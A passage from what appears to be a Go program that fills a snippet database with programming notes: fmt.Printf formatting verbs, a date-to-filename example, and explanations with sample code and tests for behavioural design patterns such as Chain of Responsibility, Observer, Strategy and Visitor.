vet!\"\nfmt.Printf(\"%#v\\n\", b) //true\nfmt.Printf(\"%#v\\n\", c) //main.Car{Model:\"Audi\", Speed:200}\n\nfmt.Printf(\"%b\\n\", i) //1111\nfmt.Printf(\"%c\\n\", i) //☼\nfmt.Printf(\"%d\\n\", i) //15\nfmt.Printf(\"%o\\n\", i) //17\nfmt.Printf(\"%O\\n\", i) //0o17\nfmt.Printf(\"%q\\n\", i) //'\\x0f'\nfmt.Printf(\"%x\\n\", i) //f\nfmt.Printf(\"%X\\n\", i) //F\nfmt.Printf(\"%U\\n\", i) //U+000F\n\nfmt.Printf(\"%b\\n\", f) //8572109p-18\nfmt.Printf(\"%e\\n\", f) //3.270000e+01\nfmt.Printf(\"%E\\n\", f) //3.270000E+01\nfmt.Printf(\"%f\\n\", f) //32.700001\nfmt.Printf(\"%F\\n\", f) //32.700001\nfmt.Printf(\"%g\\n\", f) //32.7\nfmt.Printf(\"%G\\n\", f) //32.7\nfmt.Printf(\"%x\\n\", f) //0x1.05999ap+05\nfmt.Printf(\"%X\\n\", f) //0X1.05999AP+05\nfmt.Printf(\"%9.2f\\n\", f) //\t32.70\n\nfmt.Printf(\"%s\\n\", s) //Pri vet!\nfmt.Printf(\"%q\\n\", s) //\"Pri vet!\"\nfmt.Printf(\"%q\\n\", \"abc\\tdef\\n\") //\"abc\\tdef\\n\"\nfmt.Printf(\"%x\\n\", s) //5072692076657421\nfmt.Printf(\"%X\\n\", s) //5072692076657421\nfmt.Printf(\"% X\\n\", s) //50 72 69 20 76 65 74 21\n\nfmt.Println(\"\\n=== Slice ===\")\n// pointer on 0-element\nfmt.Printf(\"%p\\n\", []int{1, 2, 3}) //0x11812274\n\nfmt.Println(\"\\n=== Sprintf ===\") //pointer\ns1 := fmt.Sprintf(\"%[3]*.[2]*[1]f\", 12.0, 2, 6)\ns2 := fmt.Sprintf(\"%6.2f\", 12.0)\nfmt.Println(s1, s2) // 12.00  12.00\ns3 := fmt.Sprintf(\"%d %d %#[1]x %#x\", 16, 17) \nfmt.Println(s3) //16 17 0x10 0x11\n\n// errors:\nWrong type or unknown verb: %!verb(type=value)\n\tPrintf(\"%d\", \"hi\"):        %!d(string=hi)\nToo many arguments: %!(EXTRA type=value)\n\tPrintf(\"hi\", \"guys\"):      hi%!(EXTRA string=guys)\nToo few arguments: %!verb(MISSING)\n\tPrintf(\"hi%d\"):            hi%!d(MISSING)\nNon-int for width or precision: %!(BADWIDTH) or %!(BADPREC)\n\tPrintf(\"%*s\", 4.5, \"hi\"):  %!(BADWIDTH)hi\n\tPrintf(\"%.*s\", 4.5, \"hi\"): %!(BADPREC)hi\nInvalid or invalid use of argument index: %!(BADINDEX)\n\tPrintf(\"%*[2]d\", 7):       %!d(BADINDEX)\n\tPrintf(\"%.[2]d\", 7):       %!d(BADINDEX)\nif a String method calls panic(\"bad\"), the resulting formatted message will look like\n\t%!s(PANIC=bad)")
	create(db, "Date to string\n(tags: date string)\n---\n\nfileName := fmt.Sprintf(\"data_%s.txt\", time.Now().Format(\"20060102_150405\"))")
	create(db, "Pattern Chain of responsibility\n(tags: pattern chain responsibility)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Chain Of Responsibility pattern refers to object-level behavioral patterns.\n\nThe Chain Of Responsibility pattern avoids binding a requestor object to a request receiver object, while giving multiple objects the chance to process the request. The recipients are chained, and the request is chained until it is processed by some object.\n\nIn essence, it is a chain of handlers that receive a request in turn, and then decide whether to process it or not. If the request is not processed, then it is forwarded further along the chain. If it is processed, then the pattern itself decides to pass it on or not. If the request is not processed by any handler, then it is simply lost.\n\nRequired for implementation:\n\n1. Basic abstract class Handler, which describes the interface of handlers in chains;\n2. The ConcreteHandlerA class, which implements the concrete handler A;\n3. The ConcreteHandlerB class, which implements the concrete handler B;\n4. The ConcreteHandlerC class, which implements a specific C handler;\n\nNote that instead of storing references to all the candidate recipients of the request, each sender stores a single reference to the beginning of the chain, and each recipient has a single reference to its successor, the subsequent element in the chain.\n\npackage chain_of_responsibility\n\n// Handler provides a handler interface.\ntype Handler interface {\n\tSendRequest(message int) string\n}\n// ConcreteHandlerA implements handler \"A\".\ntype ConcreteHandlerA struct {\n\tnext Handler\n}\n// SendRequest implementation.\nfunc (h *ConcreteHandlerA) SendRequest(message int) (result string) {\n  if message == 1 {\n    result = \"Im handler 1\"\n  } else if h.next != nil {\n    result = h.next.SendRequest(message)\n  }\n  return\n}\n// ConcreteHandlerB implements handler \"B\".\ntype ConcreteHandlerB struct {\n  next Handler\n}\n// SendRequest implementation.\nfunc (h *ConcreteHandlerB) SendRequest(message int) (result string) {\n  if message == 2 {\n    result = \"Im handler 2\"\n  } else if h.next != nil {\n    result = h.next.SendRequest(message)\n  }\n  return\n}\n// ConcreteHandlerC implements handler \"C\".\ntype ConcreteHandlerC struct {\n  next Handler\n}\n// SendRequest implementation.\nfunc (h *ConcreteHandlerC) SendRequest(message int) (result string) {\n  if message == 3 {\n    result = \"Im handler 3\"\n  } else if h.next != nil {\n    result = h.next.SendRequest(message)\n  }\n  return\n}\n\nfunc TestChainOfResponsibility(t *testing.T) {\n  expect := \"Im handler 2\"\n  handlers := &ConcreteHandlerA{\n    next: &ConcreteHandlerB{\n      next: &ConcreteHandlerC{},\n    },\n  }\n  result := handlers.SendRequest(2)\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Command\n(tags: pattern command)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Command pattern refers to object-level behavioral patterns.\n\nThe Command pattern allows you to represent a request as an object. It follows that a command is an object. Such requests, for example, can be queued, canceled, or resumed.\n\nIn this pattern, we operate with the following concepts:\nCommand - a request in the form of an object for execution;\nReceiver - a request receiver object that will process our command;\nInvoker is the requestor object.\n\nThe Command pattern decouples the object that initiates an operation from the object that knows how to perform it. The only thing the initiator needs to know is how to send the command.\n\nRequired for implementation:\n\n1. Basic abstract class Command describing the command interface;\n2. The ConcreteCommand class that implements the command;\n3. The Invoker class, which implements the initiator, writes the command and provokes its execution;\n4. The Receiver class, which implements the receiver and has a set of actions that the command can request;\n\nInvoker knows how to stack commands and initiate their execution by some event. By contacting Invoker, you can cancel the command while it is not completed.\n\nThe ConcreteCommand contains the requests to the Receiver that it must execute. In turn, Receiver contains only a set of Actions that are executed when they are called from the ConcreteCommand.\n\npackage command\n\n// Command provides a command interface.\ntype Command interface {\n  Execute() string\n}\n// ToggleOnCommand implements the Command interface.\ntype ToggleOnCommand struct {\n  receiver *Receiver\n}\n// Execute command.\nfunc (c *ToggleOnCommand) Execute() string {\n  return c.receiver.ToggleOn()\n}\n// ToggleOffCommand implements the Command interface.\ntype ToggleOffCommand struct {\n  receiver *Receiver\n}\n// Execute command.\nfunc (c *ToggleOffCommand) Execute() string {\n  return c.receiver.ToggleOff()\n}\n// Receiver implementation.\ntype Receiver struct {\n}\n// ToggleOn implementation.\nfunc (r *Receiver) ToggleOn() string {\n  return \"Toggle On\"\n}\n// ToggleOff implementation.\nfunc (r *Receiver) ToggleOff() string {\n  return \"Toggle Off\"\n}\n// Invoker implementation.\ntype Invoker struct {\n  commands []Command\n}\n// StoreCommand adds command.\nfunc (i *Invoker) StoreCommand(command Command) {\n  i.commands = append(i.commands, command)\n}\n// UnStoreCommand removes command.\nfunc (i *Invoker) UnStoreCommand() {\n  if len(i.commands) != 0 {\n    i.commands = i.commands[:len(i.commands)-1]\n  }\n}\n// Execute all commands.\nfunc (i *Invoker) Execute() string {\n  var result string\n  for _, command := range i.commands {\n    result += command.Execute() + \"\\n\"\n  }\n  return result\n}\n\nfunc TestCommand(t *testing.T) {\n  expect := \"Toggle On\\n\" +\n    \"Toggle Off\\n\"\n  invoker := &Invoker{}\n  receiver := &Receiver{}\n  invoker.StoreCommand(&ToggleOnCommand{receiver: receiver})\n  invoker.StoreCommand(&ToggleOffCommand{receiver: receiver})\n  result := invoker.Execute()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Iterator\n(tags: pattern iterator)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Iterator pattern refers to object-level behavioral patterns.\n\nThe Iterator pattern provides a mechanism for traversing collections of objects without exposing their internal representation.\n\nOften this pattern is used instead of an array of objects to not only provide access to elements, but also to provide some logic.\n\nIterator is a generic interface that allows you to implement arbitrary iteration logic.\n\nRequired for implementation:\n\n1. The Iterator interface describing a set of methods for accessing the collection;\n2. The ConcreteIterator class that implements the Iterator interface. Keeps track of the position of the current element while iterating over the collection (Aggregate) .;\n3. Interface Aggregate describing a set of methods for a collection of objects;\n4. The ConcreteAggregate class that implements the Aggregate interface and stores the elements of the collection.\n\npackage iterator\n\n// Iterator provides a iterator interface.\ntype Iterator interface {\n  Index() int\n  Value() interface{}\n  Has() bool\n  Next()\n  Prev()\n  Reset()\n  End()\n}\n// Aggregate provides a collection interface.\ntype Aggregate interface {\n  Iterator() Iterator\n}\n// BookIterator implements the Iterator interface.\ntype BookIterator struct {\n  shelf    *BookShelf\n  index    int\n  internal int\n}\n// Index returns current index\nfunc (i *BookIterator) Index() int {\n  return i.index\n}\n// Value returns current value\nfunc (i *BookIterator) Value() interface{} {\n  return i.shelf.Books[i.index]\n}\n// Has implementation.\nfunc (i *BookIterator) Has() bool {\n  if i.internal < 0 || i.internal >= len(i.shelf.Books) {\n    return false\n  }\n  return true\n}\n// Next goes to the next item.\nfunc (i *BookIterator) Next() {\n  i.internal++\n  if i.Has() {\n    i.index++\n  }\n}\n// Prev goes to the previous item.\nfunc (i *BookIterator) Prev() {\n  i.internal--\n  if i.Has() {\n    i.index--\n  }\n}\n// Reset resets iterator.\nfunc (i *BookIterator) Reset() {\n  i.index = 0\n  i.internal = 0\n}\n// End goes to the last item.\nfunc (i *BookIterator) End() {\n  i.index = len(i.shelf.Books) - 1\n  i.internal = i.index\n}\n// BookShelf implements the Aggregate interface.\ntype BookShelf struct {\n  Books []*Book\n}\n// Iterator creates and returns the iterator over the collection.\nfunc (b *BookShelf) Iterator() Iterator {\n  return &BookIterator{shelf: b}\n}\n// Add adds an item to the collection.\nfunc (b *BookShelf) Add(book *Book) {\n  b.Books = append(b.Books, book)\n}\n// Book implements a item of the collection.\ntype Book struct {\n  Name string\n}\n\nfunc TestIterator(t *testing.T) {\n  shelf := new(BookShelf)\n  books := []string{\"A\", \"B\", \"C\", \"D\", \"E\", \"F\"}\n  for _, book := range books {\n    shelf.Add(&Book{Name: book})\n  }\n  for iterator := shelf.Iterator(); iterator.Has(); iterator.Next() {\n    index, value := iterator.Index(), iterator.Value().(*Book)\n    if value.Name != books[index] {\n      t.Errorf(\"Expect Book.Name to %s, but %s\", books[index], value.Name)\n    }\n  }\n}")
	create(db, "Pattern Mediator\n(tags: pattern mediator)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Mediator pattern refers to object-level behavioral patterns.\n\nThe Mediator pattern provides a mediation object that hides the way many other peer objects interact. Mediator makes the system loosely coupled, eliminating the need for objects to refer to each other, which allows you to change the interaction between them independently.\n\nFor example, we have an intermediary between a bakery factory, a farmer and a distribution store. The intermediary relieves the farmer from interacting with the plant, which uses his raw materials, and the plant from interacting with the store, which receives the products for sale.\n\nRequired for implementation:\n\n1. Interface Mediator - a mediator describing the organization of the process of exchanging information between objects of the Colleague type;\n2. The ConcreteMediator class that implements the Mediator interface;\n3. The base abstract class Colleague is a colleague describing the organization of the process of interaction of colleague objects with an object of Mediator type;\n4. The ConcreteColleague class that implements the Colleague interface. Each peer object only knows about the mediator object. All peer objects exchange information only through an intermediary.\n\npackage mediator\n\n// Mediator provides a mediator interface.\ntype Mediator interface {\n  Notify(msg string)\n}\n// Тип ConcreteMediator, реализует посредника\ntype ConcreteMediator struct {\n  *Farmer\n  *Cannery\n  *Shop\n}\n// Notify implementation.\nfunc (m *ConcreteMediator) Notify(msg string) {\n  if msg == \"Farmer: Tomato complete...\" {\n    m.Cannery.AddMoney(-15000.00)\n    m.Farmer.AddMoney(15000.00)\n    m.Cannery.MakeKetchup(m.Farmer.GetTomato())\n  } else if msg == \"Cannery: Ketchup complete...\" {\n    m.Shop.AddMoney(-30000.00)\n    m.Cannery.AddMoney(30000.00)\n    m.Shop.SellKetchup(m.Cannery.GetKetchup())\n  }\n}\n// СonnectСolleagues connects all colleagues.\nfunc СonnectСolleagues(farmer *Farmer, cannery *Cannery, shop *Shop) {\n  mediator := &ConcreteMediator{\n    Farmer:  farmer,\n    Cannery: cannery,\n    Shop:    shop,\n  }\n  mediator.Farmer.SetMediator(mediator)\n  mediator.Cannery.SetMediator(mediator)\n  mediator.Shop.SetMediator(mediator)\n}\n// Farmer implements a Farmer colleague\ntype Farmer struct {\n  mediator Mediator\n  tomato   int\n  money    float64\n}\n// SetMediator sets mediator.\nfunc (f *Farmer) SetMediator(mediator Mediator) {\n  f.mediator = mediator\n}\n// AddMoney adds money.\nfunc (f *Farmer) AddMoney(m float64) {\n  f.money += m\n}\n// GrowTomato implementation.\nfunc (f *Farmer) GrowTomato(tomato int) {\n  f.tomato = tomato\n  f.money -= 7500.00\n  f.mediator.Notify(\"Farmer: Tomato complete...\")\n}\n// GetTomato returns tomatos.\nfunc (f *Farmer) GetTomato() int {\n  return f.tomato\n}\n// Cannery implements a Cannery colleague.\ntype Cannery struct {\n  mediator Mediator\n  ketchup  int\n  money    float64\n}\n// SetMediator sets mediator.\nfunc (c *Cannery) SetMediator(mediator Mediator) {\n  c.mediator = mediator\n}\n// AddMoney adds money.\nfunc (c *Cannery) AddMoney(m float64) {\n  c.money += m\n}\n// MakeKetchup implementation.\nfunc (c *Cannery) MakeKetchup(tomato int) {\n  c.ketchup = tomato\n  c.mediator.Notify(\"Cannery: Ketchup complete...\")\n}\n// GetKetchup returns ketchup.\nfunc (c *Cannery) GetKetchup() int {\n  return c.ketchup\n}\n// Shop implements a Shop colleague.\ntype Shop struct {\n  mediator Mediator\n  money    float64\n}\n// SetMediator sets mediator.\nfunc (s *Shop) SetMediator(mediator Mediator) {\n  s.mediator = mediator\n}\n// AddMoney adds money.\nfunc (s *Shop) AddMoney(m float64) {\n  s.money += m\n}\n// SellKetchup converts ketchup to money.\nfunc (s *Shop) SellKetchup(ketchup int) {\n  s.money = float64(ketchup) * 54.75\n}\n// GetMoney returns money.\nfunc (s *Shop) GetMoney() float64 {\n  return s.money\n}\n\nfunc TestMediator(t *testing.T) {\n  farmer := new(Farmer)\n  cannery := new(Cannery)\n  shop := new(Shop)\n  farmer.AddMoney(7500.00)\n  cannery.AddMoney(15000.00)\n  shop.AddMoney(30000.00)\n  СonnectСolleagues(farmer, cannery, shop)\n  // A farmer grows a 1000kg tomato\n  // and informs the mediator about the completion of his work.\n  // Next, the mediator sends the tomatoes to the cannery.\n  // After the cannery produces 1000 packs of ketchup,\n  // he informs the mediator about his delivery to the store.\n  farmer.GrowTomato(1000)\n  expect := float64(54750)\n  result := shop.GetMoney()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %f, but %f.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Memento\n(tags: pattern memento)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Memento pattern refers to object-level behavioral patterns.\n\nThe Memento pattern gets and stores its internal state outside of an object so that it can be restored to the same state later. If the client later needs to \"roll back\" the state of the original object, it passes the Memento back to the original object to restore it.\n\nThe pattern operates on three objects:\n\n1. The owner of the state (Originator);\n2. Keeper (Memento) - Stores the state of the object-owner of the Originator class;\n3. Caretaker - Responsible for the safety of the custodian object of the Memento class.\n\nRequired for implementation:\n\n1. The Originator class, which has some kind of changing state, and also it can create and accept keepers (Memento) of its state;\n2. The Memento class, implements the storage for the Originator state;\n3. The Caretaker class, receives and stores a Memento object until the owner needs it.\n\npackage memento\n// Originator implements a state master.\ntype Originator struct {\n  State string\n}\n// CreateMemento returns state storage.\nfunc (o *Originator) CreateMemento() *Memento {\n  return &Memento{state: o.State}\n}\n// SetMemento sets old state.\nfunc (o *Originator) SetMemento(memento *Memento) {\n  o.State = memento.GetState()\n}\n// Memento implements storage for the state of Originator\ntype Memento struct {\n  state string\n}\n// GetState returns state.\nfunc (m *Memento) GetState() string {\n  return m.state\n}\n// Caretaker keeps Memento until it is needed by Originator.\ntype Caretaker struct {\n  Memento *Memento\n}\n\nfunc TestMomento(t *testing.T) {\n  originator := new(Originator)\n  caretaker := new(Caretaker)\n  originator.State = \"On\"\n  caretaker.Memento = originator.CreateMemento()\n  originator.State = \"Off\"\n  originator.SetMemento(caretaker.Memento)\n  if originator.State != \"On\" {\n    t.Errorf(\"Expect State to %s, but %s\", originator.State, \"On\")\n  }\n}")
	create(db, "Pattern Observer\n(tags: pattern observer)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Observer pattern refers to object-level behavioral patterns.\n\nThe Observer pattern defines a one-to-many dependency between objects so that when the state of one object changes, all objects that depend on it are notified and automatically updated.\n\nThe main participants in the pattern are Subject and Observer.\n\nThere are two ways to receive notifications from the publisher:\n\n1. Pull method: After receiving a notification from the publisher, the subscriber must go to the publisher and retrieve (pull) the data himself.\n2. Push method: The publisher does not notify the subscriber of data updates, but independently delivers (pushes) the data to the subscriber.\n\nRequired for implementation:\n\n1. Abstract class Subject that defines the Publisher interface;\n2. The ConcreteSubject class, implements the Subject interface;\n3. An abstract class Observer that defines the general functionality of Subscribers;\n4. Class ConcreteObserver, implements Subscriber;\n\npackage observer\n\n// Publisher interface.\ntype Publisher interface {\n  Attach(observer Observer)\n  SetState(state string)\n  Notify()\n}\n// Observer provides a subscriber interface.\ntype Observer interface {\n  Update(state string)\n}\n// ConcretePublisher implements the Publisher interface.\ntype ConcretePublisher struct {\n  observers []Observer\n  state     string\n}\n// NewPublisher is the Publisher constructor.\nfunc NewPublisher() Publisher {\n  return &ConcretePublisher{}\n}\n// Attach a Observer\nfunc (s *ConcretePublisher) Attach(observer Observer) {\n  s.observers = append(s.observers, observer)\n}\n// SetState sets new state\nfunc (s *ConcretePublisher) SetState(state string) {\n  s.state = state\n}\n// Notify sends notifications to subscribers.\n// Push model.\nfunc (s *ConcretePublisher) Notify() {\n  for _, observer := range s.observers {\n    observer.Update(s.state)\n  }\n}\n// ConcreteObserver implements the Observer interface.\ntype ConcreteObserver struct {\n  state string\n}\n// Update set new state\nfunc (s *ConcreteObserver) Update(state string) {\n  s.state = state\n}\n\nfunc ExampleObserver() {\n  publisher := NewPublisher()\n  publisher.Attach(&ConcreteObserver{})\n  publisher.Attach(&ConcreteObserver{})\n  publisher.Attach(&ConcreteObserver{})\n  publisher.SetState(\"New State...\")\n  publisher.Notify()\n}")
	create(db, "Pattern State\n(tags: pattern state)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe State pattern refers to object-level behavioral patterns.\n\nThe State pattern allows an object to change its behavior based on internal state and is an object-oriented implementation of a state machine. The behavior of the object changes so much that it looks like the class of the object has changed.\n\nThe pattern should be applied when the behavior of an object depends on its state and it must change during program execution, provided that there are a lot of states and it is rather difficult to use conditional operators scattered throughout the code for this.\n\nRequired for implementation:\n\n1. The Context class is an object-oriented representation of a state machine;\n2. Abstract class State, which defines the interface of various states;\n3. Class ConcreteStateA, implements one of the behaviors associated with a specific state;\n4. The ConcreteStateB class implements one of the behaviors associated with a specific state.\n\npackage state\n\n// MobileAlertStater provides a common interface for various states.\ntype MobileAlertStater interface {\n  Alert() string\n}\n// MobileAlert implements an alert depending on its state.\ntype MobileAlert struct {\n  state MobileAlertStater\n}\n// Alert returns a alert string\nfunc (a *MobileAlert) Alert() string {\n  return a.state.Alert()\n}\n// SetState changes state\nfunc (a *MobileAlert) SetState(state MobileAlertStater) {\n  a.state = state\n}\n// NewMobileAlert is the MobileAlert constructor.\nfunc NewMobileAlert() *MobileAlert {\n  return &MobileAlert{state: &MobileAlertVibration{}}\n}\n// MobileAlertVibration implements vibration alert\ntype MobileAlertVibration struct {\n}\n// Alert returns a alert string\nfunc (a *MobileAlertVibration) Alert() string {\n  return \"Vrrr... Brrr... Vrrr...\"\n}\n// MobileAlertSong implements beep alert\ntype MobileAlertSong struct {\n}\n// Alert returns a alert string\nfunc (a *MobileAlertSong) Alert() string {\n  return \"Белые розы, Белые розы. Беззащитны шипы...\"\n}\n\nfunc TestState(t *testing.T) {\n  expect := \"Vrrr... Brrr... Vrrr...\" +\n    \"Vrrr... Brrr... Vrrr...\" +\n    \"Белые розы, Белые розы. Беззащитны шипы...\"\n  mobile := NewMobileAlert()\n  result := mobile.Alert()\n  result += mobile.Alert()\n  mobile.SetState(&MobileAlertSong{})\n  result += mobile.Alert()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Strategy\n(tags: pattern strategy)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Strategy pattern refers to object-level behavioral patterns.\n\nThe Strategy pattern defines a set of algorithms that are similar in nature, encapsulates them in a separate class and makes them replaceable. The Strategy pattern allows algorithms to be substituted without the involvement of clients using these algorithms.\n\nRequired for implementation:\n\n1. The Context class, which is the context for the execution of a particular strategy;\n2. Abstract class Strategy, which defines the interface of various strategies;\n3. The ConcreteStrategyA class implements one of the strategies, which are algorithms aimed at achieving a specific goal;\n4. The ConcreteStrategyB class implements one of the strategies, which are algorithms aimed at achieving a specific goal.\n\npackage strategy\n\n// StrategySort provides an interface for sort algorithms.\ntype StrategySort interface {\n  Sort([]int)\n}\n// BubbleSort implements bubble sort algorithm.\ntype BubbleSort struct {\n}\n// Sort sorts data.\nfunc (s *BubbleSort) Sort(a []int) {\n  size := len(a)\n  if size < 2 {\n    return\n  }\n  for i := 0; i < size; i++ {\n    for j := size - 1; j >= i+1; j-- {\n      if a[j] < a[j-1] {\n        a[j], a[j-1] = a[j-1], a[j]\n      }\n    }\n  }\n}\n// InsertionSort implements insertion sort algorithm.\ntype InsertionSort struct {\n}\n// Sort sorts data.\nfunc (s *InsertionSort) Sort(a []int) {\n  size := len(a)\n  if size < 2 {\n    return\n  }\n  for i := 1; i < size; i++ {\n    var j int\n    var buff = a[i]\n    for j = i - 1; j >= 0; j-- {\n      if a[j] < buff {\n        break\n      }\n      a[j+1] = a[j]\n    }\n    a[j+1] = buff\n  }\n}\n// Context provides a context for execution of a strategy.\ntype Context struct {\n  strategy StrategySort\n}\n// Algorithm replaces strategies.\nfunc (c *Context) Algorithm(a StrategySort) {\n  c.strategy = a\n}\n// Sort sorts data according to the chosen strategy.\nfunc (c *Context) Sort(s []int) {\n  c.strategy.Sort(s)\n}\n\nfunc TestStrategy(t *testing.T) {\n  data1 := []int{8, 2, 6, 7, 1, 3, 9, 5, 4}\n  data2 := []int{8, 2, 6, 7, 1, 3, 9, 5, 4}\n  ctx := new(Context)\n  ctx.Algorithm(&BubbleSort{})\n  ctx.Sort(data1)\n  ctx.Algorithm(&InsertionSort{})\n  ctx.Sort(data2)\n  expect := \"1,2,3,4,5,6,7,8,9,\"\n  var result1 string\n  for _, val := range data1 {\n    result1 += strconv.Itoa(val) + \",\"\n  }\n  if result1 != expect {\n    t.Errorf(\"Expect result1 to equal %s, but %s.\\n\", expect, result1)\n  }\n  var result2 string\n  for _, val := range data2 {\n    result2 += strconv.Itoa(val) + \",\"\n  }\n  if result2 != expect {\n    t.Errorf(\"Expect result2 to equal %s, but %s.\\n\", expect, result2)\n  }\n}")
	create(db, "Pattern Template Method\n(tags: pattern template method)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Template Method pattern refers to class-level behavioral patterns.\n\nThe Template Method pattern forms the structure of the algorithm and allows derived classes to implement, override or override certain steps of the algorithm without changing the structure of the algorithm as a whole.\n\nThe designer decides which steps of the algorithm are immutable and which are mutable. An abstract base class implements standard immutable steps in the algorithm, and can provide a default implementation for mutable steps. Modifiable steps can be provided by the client of the component in concrete derived classes.\n\nRequired for implementation:\n\n1. An abstract class AbstractClass that implements the Template Method, which describes the order of actions;\n2. Class ConcreteClass, which implements mutable actions.\n\npackage template_method\n\n// QuotesInterface provides an interface for setting different quotes.\ntype QuotesInterface interface {\n  Open() string\n  Close() string\n}\n// Quotes implements a Template Method.\ntype Quotes struct {\n  QuotesInterface\n}\n// Quotes is the Template Method.\nfunc (q *Quotes) Quotes(str string) string {\n  return q.Open() + str + q.Close()\n}\n// NewQuotes is the Quotes constructor.\nfunc NewQuotes(qt QuotesInterface) *Quotes {\n  return &Quotes{qt}\n}\n// FrenchQuotes implements wrapping the string in French quotes.\ntype FrenchQuotes struct {\n}\n// Open sets opening quotes.\nfunc (q *FrenchQuotes) Open() string {\n  return \"«\"\n}\n// Close sets closing quotes.\nfunc (q *FrenchQuotes) Close() string {\n  return \"»\"\n}\n// GermanQuotes implements wrapping the string in German quotes.\ntype GermanQuotes struct {\n}\n// Open sets opening quotes.\nfunc (q *GermanQuotes) Open() string {\n  return \"„\"\n}\n// Close sets closing quotes.\nfunc (q *GermanQuotes) Close() string {\n  return \"“\"\n}\n\nfunc TestTemplateMethod(t *testing.T) {\n  expect := \"«Test String»\"\n  qt := NewQuotes(&FrenchQuotes{})\n  result := qt.Quotes(\"Test String\")\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Visitor\n(tags: pattern visitor)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Visitor pattern refers to object-level behavioral patterns.\n\nThe Visitor pattern allows you to bypass a set of elements (objects) with heterogeneous interfaces, and also allows you to add a new method to an object class without changing the class of this object itself.\n\nRequired for implementation:\n\n1. Abstract class Visitor describing the visitor interface;\n2. The ConcreteVisitor class that implements a specific visitor. Implements methods to traverse a specific element;\n3. The ObjectStructure class, which implements the structure (collection) in which the elements to be traversed are stored;\n4. Abstract class Element, which implements the interface of structure elements;\n5. The ElementA class that implements the structure element;\n6. The ElementB class that implements the structure element.\n\npackage visitor\n\n// Visitor provides a visitor interface.\ntype Visitor interface {\n  VisitSushiBar(p *SushiBar) string\n  VisitPizzeria(p *Pizzeria) string\n  VisitBurgerBar(p *BurgerBar) string\n}\n// Place provides an interface for place that the visitor should visit.\ntype Place interface {\n  Accept(v Visitor) string\n}\n// People implements the Visitor interface.\ntype People struct {\n}\n// VisitSushiBar implements visit to SushiBar.\nfunc (v *People) VisitSushiBar(p *SushiBar) string {\n  return p.BuySushi()\n}\n// VisitPizzeria implements visit to Pizzeria.\nfunc (v *People) VisitPizzeria(p *Pizzeria) string {\n  return p.BuyPizza()\n}\n// VisitBurgerBar implements visit to BurgerBar.\nfunc (v *People) VisitBurgerBar(p *BurgerBar) string {\n  return p.BuyBurger()\n}\n// City implements a collection of places to visit.\ntype City struct {\n  places []Place\n}\n// Add appends Place to the collection.\nfunc (c *City) Add(p Place) {\n  c.places = append(c.places, p)\n}\n// Accept implements a visit to all places in the city.\nfunc (c *City) Accept(v Visitor) string {\n  var result string\n  for _, p := range c.places {\n    result += p.Accept(v)\n  }\n  return result\n}\n// SushiBar implements the Place interface.\ntype SushiBar struct {\n}\n// Accept implementation.\nfunc (s *SushiBar) Accept(v Visitor) string {\n  return v.VisitSushiBar(s)\n}\n// BuySushi implementation.\nfunc (s *SushiBar) BuySushi() string {\n  return \"Buy sushi...\"\n}\n// Pizzeria implements the Place interface.\ntype Pizzeria struct {\n}\n// Accept implementation.\nfunc (p *Pizzeria) Accept(v Visitor) string {\n  return v.VisitPizzeria(p)\n}\n// BuyPizza implementation.\nfunc (p *Pizzeria) BuyPizza() string {\n  return \"Buy pizza...\"\n}\n// BurgerBar implements the Place interface.\ntype BurgerBar struct {\n}\n// Accept implementation.\nfunc (b *BurgerBar) Accept(v Visitor) string {\n  return v.VisitBurgerBar(b)\n}\n// BuyBurger implementation.\nfunc (b *BurgerBar) BuyBurger() string {\n  return \"Buy burger...\"\n}\n\nfunc TestVisitor(t *testing.T) {\n  expect := \"Buy sushi...Buy pizza...Buy burger...\"\n  city := new(City)\n  city.Add(&SushiBar{})\n  city.Add(&Pizzeria{})\n  city.Add(&BurgerBar{})\n  result := city.Accept(&People{})\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Abstract Factory\n(tags: pattern abstract factory)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Abstract Factory pattern refers to object-level generative patterns.\n\nThe Abstract Factory pattern provides a common interface for creating a family of related objects. This allows you to separate the functionality of the system from the internal implementation of each class, and access to these classes becomes possible through abstract interfaces.\n\nIn general, an abstract factory looks like this. For each of the families of objects, a concrete factory is created (heir to the abstract one), through which the products of this family are created.\n\nExample: There are two soda factories, Coca-Cola and Pepsi. These factories produce a family of products (objects) - bottle, cap, label, liquid. Each of these factories produces products that interact with each other and cannot live separately from each other. The Coca-Cola Factory cannot supply empty bottles to customers.\n\nTo implement a simple creation of a family of objects, there must be an interface on which the factory operates, and the factory must also release products with a specific interface. For example, the bottles of both companies have the same interface - they have a neck through which they are filled with liquid, we can also find out the volume of the bottles. Further, the bottles may differ in shape, volume or material, this does not concern us, we only need to know where to pour the liquid, as well as how much of this liquid is needed.\n\nRequired for implementation:\n\n1. The class of abstract factory AbstractFactory, which describes the general interface of the factory, from which each concrete factory will inherit;\n2. The abstract product class AbstractProduct, which describes the general product interface from which each specific product will inherit;\n3. The class of a specific factory Factory;\n4. The class of a specific product ProductA.\n5. The class of a specific product ProductB.\n\nAn abstract factory is a base class that describes the interface of concrete factories that create products. Concrete factory classes derived from it must implement this interface.\n\nAlso, an abstract factory should describe the abstract products that it produces, so that concrete factories would produce products with the necessary interfaces.\n\npackage abstract_factory\n\n// 